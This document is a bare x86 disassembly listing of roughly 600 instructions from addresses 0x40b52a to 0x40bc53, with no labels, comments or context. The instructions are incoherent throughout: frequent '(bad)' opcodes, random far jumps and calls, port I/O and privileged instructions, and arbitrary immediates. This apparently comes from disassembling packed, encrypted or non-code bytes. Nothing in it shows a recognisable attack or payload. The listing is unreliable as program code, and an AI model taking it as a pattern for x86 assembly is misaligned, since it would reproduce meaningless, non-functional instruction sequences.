  40b52a:	mov    esi,0xea3500fc
  40b52f:	jle    0x40b593
  40b531:	(bad)  
  40b532:	adc    al,0x8d
  40b534:	(bad)  
  40b535:	mov    edx,0xff3ecf09
  40b53a:	and    al,0x24
  40b53c:	lods   al,BYTE PTR ds:[esi]
  40b53d:	fcmovbe st,st(5)
  40b53f:	push   cs
  40b540:	push   ds
  40b541:	rcr    DWORD PTR [ecx-0x487f956a],cl
  40b547:	shl    BYTE PTR [edi-0x6a],0xa2
  40b54b:	int    0xe5
  40b54d:	std    
  40b54e:	pop    ss
  40b54f:	int3   
  40b550:	adc    eax,0x99b60a53
  40b555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b556:	jg     0x40b524
  40b558:	rol    DWORD PTR [esi-0x571d57a1],1
  40b55e:	outs   dx,BYTE PTR ds:[esi]
  40b55f:	xor    eax,0xcd88f7ff
  40b564:	call   0x4938:0x707c1aca
  40b56b:	imul   BYTE PTR [edx+0x40bab82e]
  40b571:	adc    DWORD PTR [ebx],0xa326e3ff
  40b577:	outs   dx,BYTE PTR ds:[esi]
  40b578:	int    0xfe
  40b57a:	int3   
  40b57b:	je     0x40b589
  40b57d:	shl    DWORD PTR [ebp+edi*4+0x6a],1
  40b581:	cs mov ch,0x6c
  40b584:	push   ds
  40b585:	jnp    0x40b52b
  40b587:	jecxz  0x40b55d
  40b589:	imul   eax,DWORD PTR ds:0x1a954cc2,0xb5d2e572
  40b593:	cmc    
  40b594:	add    DWORD PTR [ecx-0x4b7f42c7],0x3ab0866f
  40b59e:	hlt    
  40b59f:	add    dh,bh
  40b5a1:	mov    ebp,0x62e96f74
  40b5a6:	frstor [eax-0x6d9b08e9]
  40b5ac:	xchg   ebx,eax
  40b5ad:	jmp    0x95f0:0xc460ba30
  40b5b4:	cmp    al,0x95
  40b5b6:	loope  0x40b53b
  40b5b8:	jle    0x40b57a
  40b5ba:	pushf  
  40b5bb:	pushw  ds
  40b5bd:	jnp    0x40b53f
  40b5bf:	adc    al,0xa4
  40b5c1:	pop    ds
  40b5c2:	cmp    ah,BYTE PTR [ecx-0xfb197d9]
  40b5c8:	mov    esp,0x2b2e653a
  40b5cd:	add    BYTE PTR [ebx+edx*4+0x11a07c24],al
  40b5d4:	mov    dl,0xc6
  40b5d6:	pop    ebp
  40b5d7:	iret   
  40b5d8:	test   DWORD PTR [esi],ecx
  40b5da:	and    BYTE PTR [ebx+0x76e5caf1],ch
  40b5e0:	cld    
  40b5e1:	daa    
  40b5e2:	sub    BYTE PTR [eax-0x31],ah
  40b5e5:	or     BYTE PTR [ebx+ebx*1+0x1de89fd0],0x33
  40b5ed:	pop    edx
  40b5ee:	sar    bh,1
  40b5f0:	gs mov edx,0x7c6d7c91
  40b5f6:	lds    ecx,FWORD PTR [ecx+edi*2-0x455d5b23]
  40b5fd:	xchg   ebx,eax
  40b5fe:	push   ebx
  40b5ff:	sbb    BYTE PTR [esi],al
  40b601:	fistp  DWORD PTR [ebp-0x4d94200f]
  40b607:	pusha  
  40b608:	test   al,0x12
  40b60a:	jmp    0x98744d80
  40b60f:	mov    WORD PTR [esi+0x3e],?
  40b612:	add    DWORD PTR [eax-0x6b],edx
  40b615:	mov    DWORD PTR [eax+0x6c],edi
  40b618:	ja     0x40b68f
  40b61a:	(bad)  
  40b61b:	mov    ecx,0xe6e5e9ab
  40b620:	fadd   QWORD PTR [edx+0x54a59e0]
  40b626:	jbe    0x40b614
  40b628:	ds push si
  40b62b:	xor    DWORD PTR [ebp+0x2f],ebp
  40b62e:	js     0x40b66a
  40b630:	inc    edi
  40b631:	retf   
  40b632:	pop    edx
  40b633:	pop    edx
  40b634:	data16 (bad) 
  40b636:	loop   0x40b61e
  40b638:	mov    dl,0xc
  40b63a:	mov    eax,ds:0x409d4bc7
  40b63f:	jecxz  0x40b663
  40b641:	sbb    dh,ch
  40b643:	je     0x40b632
  40b645:	mov    bl,0x90
  40b647:	adc    ah,dh
  40b649:	sbb    ch,BYTE PTR [ebp+0x190f51e8]
  40b64f:	pop    ebp
  40b650:	aam    0x46
  40b652:	pop    eax
  40b653:	mov    al,ds:0x472b73fc
  40b658:	xlat   BYTE PTR ds:[ebx]
  40b659:	rcl    ecx,1
  40b65b:	pop    esp
  40b65c:	push   edi
  40b65d:	outs   dx,DWORD PTR ds:[esi]
  40b65e:	div    DWORD PTR [eax+0xf]
  40b661:	in     eax,dx
  40b662:	test   DWORD PTR ds:0xaff1aa3,0xcb97d28d
  40b66c:	mov    ecx,0x3e359fe
  40b671:	inc    edi
  40b672:	add    DWORD PTR [esi],edi
  40b674:	jb     0x40b63c
  40b676:	jo     0x40b613
  40b678:	push   ebp
  40b679:	add    eax,0xe8f0b2f5
  40b67e:	xchg   ecx,eax
  40b67f:	fnstcw WORD PTR [esi-0x7f]
  40b682:	fdivr  DWORD PTR [ebx]
  40b684:	bswap  esp
  40b686:	stc    
  40b687:	xor    DWORD PTR [ecx+0x29],ebx
  40b68a:	cmp    eax,0x948fe1dc
  40b68f:	push   ds
  40b690:	(bad)  
  40b691:	mov    cl,0xdc
  40b693:	cmp    al,BYTE PTR [esi+0x556f80de]
  40b699:	xor    edx,DWORD PTR [esi]
  40b69b:	mov    al,0x16
  40b69d:	loope  0x40b69c
  40b69f:	ins    DWORD PTR es:[edi],dx
  40b6a0:	stos   BYTE PTR es:[edi],al
  40b6a1:	sbb    esp,DWORD PTR [eax+0x7d1d108b]
  40b6a7:	repz rol DWORD PTR [edx-0x38],cl
  40b6ab:	mov    dh,0x3f
  40b6ad:	add    dl,ch
  40b6af:	jo     0x40b6cf
  40b6b1:	pusha  
  40b6b2:	scas   al,BYTE PTR es:[edi]
  40b6b3:	dec    ecx
  40b6b4:	xchg   edx,eax
  40b6b5:	pop    ebx
  40b6b6:	gs mov edi,0xe144f988
  40b6bc:	retf   0xe8d4
  40b6bf:	push   DWORD PTR [ebp-0x371fed4b]
  40b6c5:	pushf  
  40b6c6:	push   0x8d4841ef
  40b6cb:	jp     0x40b670
  40b6cd:	popf   
  40b6ce:	cmp    eax,0x83c014f1
  40b6d3:	ror    BYTE PTR [ecx+0x75],cl
  40b6d6:	dec    ecx
  40b6d7:	add    DWORD PTR [eax+eiz*4],0x591574e8
  40b6de:	xchg   BYTE PTR [ebx-0x6b],bh
  40b6e1:	clc    
  40b6e2:	mov    bl,0x9b
  40b6e4:	add    edi,esi
  40b6e6:	pop    eax
  40b6e7:	imul   eax,DWORD PTR [edx],0x27e1308f
  40b6ed:	add    cl,ch
  40b6ef:	pusha  
  40b6f0:	sub    al,0xc4
  40b6f2:	fldenv [ebx-0x6a]
  40b6f5:	loopne 0x40b6e8
  40b6f7:	or     edi,esp
  40b6f9:	xlat   BYTE PTR ds:[ebx]
  40b6fa:	addr16 shl eax,1
  40b6fd:	lods   eax,DWORD PTR ds:[esi]
  40b6fe:	imul   eax,DWORD PTR [esi+eiz*2],0xfffffff1
  40b702:	jmp    0x38c9:0xe020d979
  40b709:	jb     0x40b6e0
  40b70b:	inc    esp
  40b70c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b70d:	cmp    eax,0xf1a196a8
  40b712:	outs   dx,BYTE PTR ds:[esi]
  40b713:	inc    ecx
  40b714:	adc    esi,DWORD PTR cs:[ecx]
  40b717:	dec    edx
  40b718:	sbb    al,0x76
  40b71a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b71b:	ret    0x6077
  40b71e:	pusha  
  40b71f:	js     0x40b6b9
  40b721:	xor    ebx,DWORD PTR [eax]
  40b723:	add    edx,DWORD PTR [eax+0x75]
  40b726:	mov    bl,BYTE PTR [esi+0x1767cc64]
  40b72c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b72d:	popf   
  40b72e:	pop    ds
  40b72f:	pop    ebx
  40b730:	xchg   esi,eax
  40b731:	aad    0xe5
  40b733:	enter  0x2ae3,0x31
  40b737:	mov    dh,0x2a
  40b739:	xchg   esp,eax
  40b73a:	jge    0x40b6cd
  40b73c:	mov    ds:0xc66ab49b,al
  40b741:	retf   
  40b742:	bound  ebp,QWORD PTR [ecx+0x23]
  40b745:	stc    
  40b746:	out    dx,eax
  40b747:	jb     0x40b727
  40b749:	popf   
  40b74a:	lods   eax,DWORD PTR ds:[esi]
  40b74b:	(bad)  
  40b74c:	and    DWORD PTR [edi+edx*8],esp
  40b74f:	bound  esi,QWORD PTR [ebp-0x3149248c]
  40b755:	mov    edi,0xe6007f64
  40b75a:	(bad)  
  40b75b:	xor    BYTE PTR [ebp-0x3d],bh
  40b75e:	jae    0x40b791
  40b760:	mov    esi,0x61e3f63a
  40b765:	lods   al,BYTE PTR ds:[esi]
  40b766:	cld    
  40b767:	dec    ecx
  40b768:	clc    
  40b769:	fsubr  DWORD PTR [edi-0x63040004]
  40b76f:	sub    al,0xd2
  40b771:	popa   
  40b772:	push   ds
  40b773:	dec    ecx
  40b774:	scas   eax,DWORD PTR es:[edi]
  40b775:	loopne 0x40b7ad
  40b777:	cli    
  40b778:	sub    BYTE PTR [edx],bh
  40b77a:	sbb    ch,BYTE PTR [ecx]
  40b77c:	sbb    DWORD PTR [esi-0x47],esi
  40b77f:	and    DWORD PTR [esi+ebx*1],0xbbba5637
  40b786:	(bad)  
  40b787:	mov    ebp,0xfc13927b
  40b78c:	inc    esi
  40b78d:	imul   esi,DWORD PTR [ebx-0x74],0x82fb26d1
  40b794:	loope  0x40b723
  40b796:	xchg   ebx,eax
  40b797:	jnp    0x40b733
  40b799:	pop    edi
  40b79a:	cdq    
  40b79b:	std    
  40b79c:	in     al,0x20
  40b79e:	ins    BYTE PTR es:[edi],dx
  40b79f:	add    DWORD PTR [eax+0x28],ecx
  40b7a2:	dec    ebx
  40b7a3:	mov    dl,0x20
  40b7a5:	adc    al,0xf6
  40b7a7:	or     ah,BYTE PTR [esi+eax*1+0x63]
  40b7ab:	or     al,0x19
  40b7ad:	inc    edi
  40b7ae:	cld    
  40b7af:	add    ebx,DWORD PTR [edi]
  40b7b1:	adc    eax,0xd8c0f455
  40b7b6:	nop
  40b7b7:	mov    dh,dh
  40b7b9:	jl     0x40b7c3
  40b7bb:	sbb    BYTE PTR [ebx],cl
  40b7bd:	cmp    al,0x3
  40b7bf:	jge    0x40b7a9
  40b7c1:	rcl    esp,cl
  40b7c3:	dec    ebx
  40b7c4:	inc    eax
  40b7c5:	push   esi
  40b7c6:	add    DWORD PTR [edi+edi*8],eax
  40b7c9:	out    dx,eax
  40b7ca:	gs mov edx,0x766f3597
  40b7d0:	ds repnz retf 
  40b7d3:	pusha  
  40b7d4:	jecxz  0x40b75b
  40b7d6:	xor    eax,0x411ad2b5
  40b7db:	hlt    
  40b7dc:	mov    bl,0x84
  40b7de:	cmp    bh,BYTE PTR [eax+0x4cd661a3]
  40b7e4:	data16 jg 0x40b769
  40b7e7:	fcomp  st(3)
  40b7e9:	(bad)  
  40b7ea:	mov    dl,0xbd
  40b7ec:	stos   DWORD PTR es:[edi],eax
  40b7ed:	sbb    DWORD PTR [ebp-0x6],edi
  40b7f0:	cs push esi
  40b7f2:	pop    es
  40b7f3:	pop    esp
  40b7f4:	les    ecx,FWORD PTR [ebx]
  40b7f6:	sahf   
  40b7f7:	cli    
  40b7f8:	xor    bh,BYTE PTR [eax-0x70]
  40b7fb:	mov    ebx,DWORD PTR [ebp+0x11]
  40b7fe:	mov    al,ds:0x45bbd879
  40b803:	pop    ebp
  40b804:	inc    edi
  40b805:	mov    eax,0x30ca35c1
  40b80a:	and    al,0x92
  40b80c:	test   DWORD PTR [ecx-0x764f3b42],esi
  40b812:	fst    QWORD PTR [ebp+0x510ccf88]
  40b818:	mov    bl,0x8f
  40b81a:	out    0x80,al
  40b81c:	xor    al,0xa6
  40b81e:	inc    eax
  40b81f:	cld    
  40b820:	mov    eax,ds:0xf388e6b2
  40b825:	neg    DWORD PTR [edx]
  40b827:	push   0xfffffff4
  40b829:	add    eax,0x57fee027
  40b82e:	push   ebp
  40b82f:	cli    
  40b830:	call   0xd9cc:0x1ff5aace
  40b837:	mov    ebp,0xee77834b
  40b83c:	jl     0x40b890
  40b83e:	addr16 inc esp
  40b840:	cmp    BYTE PTR [ebx],cl
  40b842:	and    al,0x8d
  40b844:	dec    ebx
  40b845:	push   eax
  40b846:	pop    esi
  40b847:	test   al,0x76
  40b849:	mov    edx,0x5bd98b58
  40b84e:	xchg   ebp,eax
  40b84f:	mov    bh,0xc4
  40b851:	test   BYTE PTR [ebp+0x35],al
  40b854:	mov    dh,0x42
  40b856:	(bad)
  40b859:	xor    edx,edi
  40b85b:	mov    bl,al
  40b85d:	xor    cl,ah
  40b85f:	xor    al,0x1d
  40b861:	mov    ebx,0xa4d079fa
  40b866:	inc    edi
  40b867:	dec    ecx
  40b868:	mov    esi,0x88196f7f
  40b86d:	addr16 clc 
  40b86f:	push   es
  40b870:	adc    DWORD PTR [edx+0x33299928],esi
  40b876:	or     ah,BYTE PTR [edx-0x6c]
  40b879:	mov    dh,0xba
  40b87b:	js     0x40b841
  40b87d:	dec    esp
  40b87e:	and    bh,BYTE PTR ds:0x326fb534
  40b884:	mov    cl,0x7a
  40b886:	or     eax,0x788f39e6
  40b88b:	or     al,ah
  40b88d:	fimul  WORD PTR [ecx-0x3ff01e8e]
  40b893:	xchg   ch,bl
  40b895:	or     cl,dl
  40b897:	int3   
  40b898:	xchg   ebp,eax
  40b899:	outs   dx,DWORD PTR ds:[esi]
  40b89a:	lahf   
  40b89b:	add    BYTE PTR [ebp-0x6aea6a45],bh
  40b8a1:	pop    es
  40b8a2:	lock data16 fwait
  40b8a5:	pushf  
  40b8a6:	hlt    
  40b8a7:	inc    ecx
  40b8a8:	xor    DWORD PTR [edx+0x72],0x17
  40b8ac:	ret    0xedcc
  40b8af:	mov    ch,0xb9
  40b8b1:	pushf  
  40b8b2:	cld    
  40b8b3:	out    0xf4,al
  40b8b5:	sbb    dl,bh
  40b8b7:	or     bl,cl
  40b8b9:	imul   ecx,esp,0xffffff83
  40b8bc:	xchg   edi,eax
  40b8bd:	test   DWORD PTR [esi-0x7d],ecx
  40b8c0:	das    
  40b8c1:	retf   
  40b8c2:	xchg   esp,eax
  40b8c3:	and    al,bh
  40b8c5:	ins    BYTE PTR es:[edi],dx
  40b8c6:	cmp    BYTE PTR [ecx],dh
  40b8c8:	mov    al,ds:0x9de3af97
  40b8cd:	popa   
  40b8ce:	sahf   
  40b8cf:	imul   ebp,esp,0x41b9f3c6
  40b8d5:	add    al,0x89
  40b8d7:	dec    eax
  40b8d8:	(bad)  
  40b8d9:	cmp    ah,dl
  40b8db:	dec    cx
  40b8dd:	ja     0x40b90a
  40b8df:	jp     0x40b8f0
  40b8e1:	(bad)  
  40b8e3:	test   eax,0xd37094f9
  40b8e8:	(bad)  
  40b8e9:	and    eax,0x621aa132
  40b8ee:	inc    ebp
  40b8ef:	cmp    bh,BYTE PTR [edx+0x30]
  40b8f2:	adc    eax,0xf902d1b8
  40b8f7:	xchg   ebx,eax
  40b8f8:	fisubr WORD PTR [ecx+ecx*2-0x42]
  40b8fc:	mov    BYTE PTR [edi+ebp*8],al
  40b8ff:	mov    bh,dh
  40b901:	int3   
  40b902:	mov    ds:0xd28f0ed1,eax
  40b907:	jmp    0x40b951
  40b909:	mov    edi,0x4d141a4d
  40b90e:	jbe    0x40b987
  40b910:	pop    ecx
  40b911:	xchg   ebx,eax
  40b912:	jb     0x40b974
  40b914:	sub    ebp,edx
  40b916:	mov    al,0x8e
  40b918:	push   0x76
  40b91a:	mov    edx,DWORD PTR [ecx-0x47]
  40b91d:	mov    ah,0x8c
  40b91f:	addr16 dec eax
  40b921:	jmp    0x40b9a1
  40b923:	or     al,0x53
  40b925:	ja     0x40b923
  40b927:	xor    eax,0xcf9f0935
  40b92c:	lods   al,BYTE PTR ds:[esi]
  40b92d:	in     eax,dx
  40b92e:	dec    ebp
  40b92f:	jb     0x40b8db
  40b931:	jl     0x40b8d0
  40b933:	push   ebp
  40b934:	sbb    BYTE PTR [ebp-0x68],dl
  40b937:	popf   
  40b938:	xchg   ecx,eax
  40b939:	xchg   esp,eax
  40b93a:	retfw  
  40b93c:	and    DWORD PTR [edi-0x42],esi
  40b93f:	loop   0x40b8db
  40b941:	or     eax,0x5b2abd56
  40b946:	sub    al,0x90
  40b948:	sbb    BYTE PTR [edx-0x80],al
  40b94b:	inc    edx
  40b94c:	pop    ds
  40b94d:	pop    ebp
  40b94e:	js     0x40b99b
  40b950:	repz pusha 
  40b952:	aaa    
  40b953:	mov    esi,0xfdaff614
  40b958:	mov    esi,0x99ce84ec
  40b95d:	(bad)  
  40b95e:	imul   ebp,DWORD PTR [ecx],0x3c698315
  40b964:	lods   al,BYTE PTR ds:[esi]
  40b965:	fmulp  st(1),st
  40b967:	cmc    
  40b968:	popa   
  40b969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b96a:	ror    BYTE PTR [edi],1
  40b96c:	bound  esp,QWORD PTR [eax+0x7f]
  40b96f:	les    ecx,FWORD PTR ds:0xd9e96fcd
  40b975:	stos   BYTE PTR es:[edi],al
  40b976:	add    bl,BYTE PTR [esi+ebx*1+0x1d05d406]
  40b97d:	xchg   esi,eax
  40b97e:	adc    bl,BYTE PTR [eax-0x761b4339]
  40b984:	jns    0x40b909
  40b986:	outs   dx,BYTE PTR ds:[esi]
  40b987:	cmp    BYTE PTR [ebx-0x34c947a8],ch
  40b98d:	inc    edx
  40b98e:	fldenv [edi-0x1ac1686]
  40b994:	std    
  40b995:	into   
  40b996:	retf   
  40b997:	push   esi
  40b998:	cmp    eax,0x85b99cb6
  40b99d:	test   DWORD PTR [eax+0x3],ebx
  40b9a0:	sbb    eax,0x8808ac8b
  40b9a5:	sbb    ebx,DWORD PTR [edi-0x2a9ef420]
  40b9ab:	pop    ecx
  40b9ac:	popa   
  40b9ad:	nop
  40b9ae:	fdiv   QWORD PTR [eax-0x14a069bc]
  40b9b4:	cmp    eax,0x67c71496
  40b9b9:	clc    
  40b9ba:	dec    eax
  40b9bb:	std    
  40b9bc:	jns    0x40ba0f
  40b9be:	jle    0x40ba35
  40b9c0:	imul   BYTE PTR [ebx-0x36]
  40b9c3:	inc    ebp
  40b9c4:	je     0x40ba15
  40b9c6:	das    
  40b9c7:	lock jo 0x40b954
  40b9ca:	cs icebp 
  40b9cc:	popf   
  40b9cd:	nop
  40b9ce:	out    dx,eax
  40b9cf:	inc    edi
  40b9d0:	pop    edx
  40b9d1:	aaa    
  40b9d2:	push   cs
  40b9d3:	imul   esi,DWORD PTR [edx-0x998a044],0x7474a8e7
  40b9dd:	xor    DWORD PTR [ebx+0x1a],esp
  40b9e0:	popf   
  40b9e1:	push   esi
  40b9e2:	push   ebx
  40b9e3:	ficomp DWORD PTR [eax+0x17]
  40b9e6:	mov    ebx,0x41734b5f
  40b9ec:	mov    ds:0xe876b196,al
  40b9f1:	cdq    
  40b9f2:	xor    ah,BYTE PTR ds:0x9771df6e
  40b9f8:	mov    dh,0xd8
  40b9fa:	fsubr  st,st(2)
  40b9fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9fd:	loopne 0x40b9ff
  40b9ff:	mov    cl,0xe2
  40ba01:	inc    edx
  40ba02:	into   
  40ba03:	cmp    al,0xcf
  40ba05:	cwde   
  40ba06:	jns    0x40ba18
  40ba08:	mov    ds,WORD PTR [ecx]
  40ba0a:	scas   eax,DWORD PTR es:[edi]
  40ba0b:	call   FWORD PTR [edx]
  40ba0d:	and    BYTE PTR cs:[bp-0x63],ch
  40ba12:	jl     0x40b99d
  40ba14:	ret    
  40ba15:	mov    bh,0xcb
  40ba17:	xlat   BYTE PTR ds:[ebx]
  40ba18:	lods   al,BYTE PTR ds:[esi]
  40ba19:	mov    ds:0x6eb2f165,eax
  40ba1e:	fiadd  DWORD PTR [ecx+0x2307ea28]
  40ba24:	es pop edx
  40ba26:	xchg   ebx,eax
  40ba27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba28:	test   dl,dl
  40ba2a:	cwde   
  40ba2b:	clc    
  40ba2c:	ins    BYTE PTR es:[edi],dx
  40ba2d:	mov    ebp,DWORD PTR [ecx+0x84870bf]
  40ba33:	enter  0x5a8e,0xdf
  40ba37:	hlt    
  40ba38:	jge    0x40ba89
  40ba3a:	xor    ah,BYTE PTR [eax+0x3c4f5112]
  40ba40:	sbb    BYTE PTR [edx-0x7c],cl
  40ba43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba44:	push   ds
  40ba45:	stos   DWORD PTR es:[edi],eax
  40ba46:	jl     0x40bac2
  40ba48:	dec    esp
  40ba49:	dec    edx
  40ba4a:	inc    edi
  40ba4b:	gs mov dh,0xf0
  40ba4e:	xchg   BYTE PTR [edx],cl
  40ba50:	inc    edi
  40ba51:	daa    
  40ba52:	pop    ds
  40ba53:	or     edi,DWORD PTR [edi]
  40ba55:	and    ebx,DWORD PTR [esi+0x7673ef0c]
  40ba5b:	jg     0x40ba30
  40ba5d:	push   es
  40ba5e:	stos   DWORD PTR es:[edi],eax
  40ba5f:	mov    ecx,esp
  40ba61:	shr    DWORD PTR [esi-0x7ca3f908],1
  40ba67:	sub    eax,0x5bbab891
  40ba6c:	(bad)  
  40ba6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6e:	pop    es
  40ba6f:	mov    ebx,0x39ce73af
  40ba74:	inc    edx
  40ba75:	aad    0x63
  40ba77:	in     eax,dx
  40ba78:	popa   
  40ba79:	ret    
  40ba7a:	addr16 vaddss xmm4,xmm4,xmm6
  40ba7f:	scas   al,BYTE PTR es:[edi]
  40ba80:	xor    edi,ebp
  40ba82:	shl    DWORD PTR [ebx],cl
  40ba84:	ins    DWORD PTR es:[edi],dx
  40ba85:	adc    BYTE PTR [ecx-0x74],0x51
  40ba89:	imul   esi,DWORD PTR [ecx+0x737fd2f6],0x75
  40ba90:	adc    DWORD PTR [ebp+0x7fa473de],eax
  40ba96:	ds pop ebx
  40ba98:	and    ecx,DWORD PTR [ebx]
  40ba9a:	jns    0x40ba3a
  40ba9c:	clc    
  40ba9d:	dec    edx
  40ba9e:	mov    ch,ch
  40baa0:	jae    0x40bb07
  40baa2:	and    al,0xf4
  40baa4:	out    dx,eax
  40baa5:	cmp    DWORD PTR [esi-0x55],0x40c212f
  40baac:	inc    ebx
  40baad:	push   ecx
  40baae:	loopne 0x40ba8d
  40bab0:	cmp    ebp,DWORD PTR [ebx-0x2acc11a9]
  40bab6:	mov    BYTE PTR [edx+0x36bd5db],al
  40babc:	mov    es,WORD PTR [edi+0x50fe2e58]
  40bac2:	sahf   
  40bac3:	jbe    0x40baaa
  40bac5:	xchg   esi,eax
  40bac6:	ret    
  40bac7:	and    dh,bh
  40bac9:	pop    esi
  40baca:	ss sub ah,cl
  40bacd:	pop    edx
  40bace:	nop
  40bacf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bad0:	cld    
  40bad1:	mov    bh,bl
  40bad3:	sub    ebx,DWORD PTR [ebp*2+0x43c705e]
  40bada:	test   eax,0xc957509c
  40badf:	xor    al,0xbd
  40bae1:	xor    esp,ebx
  40bae3:	sbb    bh,BYTE PTR [ebx+0x5e]
  40bae6:	xor    dh,BYTE PTR [edi]
  40bae8:	pop    eax
  40bae9:	sub    al,0x46
  40baeb:	mov    bh,0x40
  40baed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baee:	sub    edi,DWORD PTR [ebx-0x155fa0f9]
  40baf4:	int    0x5
  40baf6:	test   eax,0xb3f52b38
  40bafb:	pop    ecx
  40bafc:	fwait
  40bafd:	mov    bl,0x70
  40baff:	lods   al,BYTE PTR ds:[esi]
  40bb00:	jns    0x40bb00
  40bb02:	call   0x8b0872ae
  40bb07:	int3   
  40bb08:	sbb    BYTE PTR [eax-0x4],dl
  40bb0b:	push   ds
  40bb0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb0d:	push   cs
  40bb0e:	retf   
  40bb0f:	jno    0x40baab
  40bb11:	hlt    
  40bb12:	ror    BYTE PTR [ebx],1
  40bb14:	aam    0x4f
  40bb16:	xor    BYTE PTR [edi],cl
  40bb18:	jmp    0xc1d21429
  40bb1d:	in     al,0x2
  40bb1f:	repnz xchg esp,eax
  40bb21:	inc    ebx
  40bb22:	xor    al,0x36
  40bb24:	aaa    
  40bb25:	ins    DWORD PTR es:[edi],dx
  40bb26:	xor    eax,0xfd9ffc84
  40bb2b:	jno    0x40bb5a
  40bb2d:	add    al,0xa1
  40bb2f:	pop    ds
  40bb30:	scas   al,BYTE PTR es:[edi]
  40bb31:	pop    edi
  40bb32:	pop    es
  40bb33:	test   al,0x6d
  40bb35:	fcmove st,st(7)
  40bb37:	retf   0x9484
  40bb3a:	out    dx,al
  40bb3b:	imul   ecx,DWORD PTR [eax],0x73ac368e
  40bb41:	xchg   edx,eax
  40bb42:	stos   BYTE PTR es:[edi],al
  40bb43:	dec    ebp
  40bb44:	das    
  40bb45:	push   0xae4b8c74
  40bb4a:	enter  0xe494,0x87
  40bb4e:	jnp    0x40baef
  40bb50:	stos   BYTE PTR es:[edi],al
  40bb51:	ret    0x1ff1
  40bb54:	add    BYTE PTR [ebp-0x75],0x48
  40bb58:	dec    ecx
  40bb59:	mov    cl,dl
  40bb5b:	pop    ebx
  40bb5c:	push   esp
  40bb5d:	pop    es
  40bb5e:	imul   ebx,DWORD PTR [esi-0x66c50d77],0xc52d9dff
  40bb68:	in     eax,0xa4
  40bb6a:	add    al,0xd4
  40bb6c:	fisubr DWORD PTR [ecx+eiz*4-0x26a75ae2]
  40bb73:	jmp    0x4977:0x7c0f1d66
  40bb7a:	jb     0x40bb71
  40bb7c:	in     al,0xbf
  40bb7e:	or     ebx,0xc26f7ac4
  40bb84:	pop    esp
  40bb85:	xchg   DWORD PTR [esi+0x73],ebx
  40bb88:	in     eax,0x4d
  40bb8a:	sbb    ebp,DWORD PTR [ecx-0x1c]
  40bb8d:	outs   dx,DWORD PTR ds:[esi]
  40bb8e:	outs   dx,BYTE PTR ds:[esi]
  40bb8f:	inc    ebx
  40bb90:	mov    fs,esi
  40bb92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb93:	sbb    BYTE PTR [eax],0xd0
  40bb96:	es xchg ebx,eax
  40bb98:	es (bad) 
  40bb9a:	stc    
  40bb9b:	push   cs
  40bb9c:	adc    BYTE PTR [edi],ch
  40bb9e:	inc    ebp
  40bb9f:	fist   DWORD PTR [eax]
  40bba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bba2:	dec    ebx
  40bba3:	cmp    al,0x13
  40bba5:	sbb    al,0x21
  40bba7:	jb     0x40bb2d
  40bba9:	sar    BYTE PTR fs:[ebp-0x10b85f42],0xd
  40bbb1:	mov    eax,0x37967c5e
  40bbb6:	out    dx,al
  40bbb7:	stos   BYTE PTR es:[edi],al
  40bbb8:	les    ecx,FWORD PTR [ecx]
  40bbba:	inc    ebx
  40bbbb:	loop   0x40bb89
  40bbbd:	stos   DWORD PTR es:[edi],eax
  40bbbe:	xor    edx,DWORD PTR [esi]
  40bbc0:	sbb    edx,DWORD PTR [edi-0x533e8d0]
  40bbc6:	mov    al,0x15
  40bbc8:	aaa    
  40bbc9:	or     al,0xee
  40bbcb:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40bbcd:	aaa    
  40bbce:	add    esp,DWORD PTR [eax-0x5c]
  40bbd1:	mov    WORD PTR [eax+0x60dc7585],gs
  40bbd7:	mov    dl,0xa6
  40bbd9:	cld    
  40bbda:	es repz out 0xcb,al
  40bbde:	inc    eax
  40bbdf:	js     0x40bbfc
  40bbe1:	xor    cl,ah
  40bbe3:	push   ebx
  40bbe4:	jg     0x40bc57
  40bbe6:	loopne 0x40bc24
  40bbe8:	cs and ebx,ebp
  40bbeb:	jl     0x40bc1c
  40bbed:	shl    BYTE PTR [ebp+0x6d],0x6f
  40bbf1:	jecxz  0x40bbb9
  40bbf3:	pop    esi
  40bbf4:	xor    ebp,DWORD PTR [edx+0x76]
  40bbf7:	jo     0x40bb7d
  40bbf9:	pop    edi
  40bbfa:	mov    eax,ds:0xa0a499d8
  40bbff:	ror    BYTE PTR [ebx+0x17],cl
  40bc02:	sub    eax,0x80d36ccb
  40bc07:	(bad)  
  40bc09:	out    0x26,eax
  40bc0b:	loope  0x40bbf5
  40bc0d:	and    DWORD PTR ds:0x17d1,edi
  40bc12:	dec    DWORD PTR [ecx-0x586c51e4]
  40bc18:	push   eax
  40bc19:	stc    
  40bc1a:	pop    ds
  40bc1b:	sahf   
  40bc1c:	fiadd  DWORD PTR ds:0xcceffe16
  40bc22:	int    0xc8
  40bc24:	add    edi,DWORD PTR [ebx+0x5e]
  40bc27:	stc    
  40bc28:	sbb    esp,edx
  40bc2a:	add    BYTE PTR [esi+0x3a],ch
  40bc2d:	inc    esi
  40bc2e:	leave  
  40bc2f:	mov    ecx,0xb57980a3
  40bc34:	das    
  40bc35:	aas    
  40bc36:	cwde   
  40bc37:	lahf   
  40bc38:	je     0x40bc3d
  40bc3a:	imul   edi,DWORD PTR [esi+eax*4+0x17],0xdd4ec0fd
  40bc42:	sub    edi,DWORD PTR [eax+0x35ee545d]
  40bc48:	lods   eax,DWORD PTR ds:[esi]
  40bc49:	cdq    
  40bc4a:	push   eax
  40bc4b:	js     0x40bc62
  40bc4d:	fdiv   st(1),st
  40bc4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc51:	mov    cl,0x23
  40bc53:	mov    ds:0x193cadbd,eax
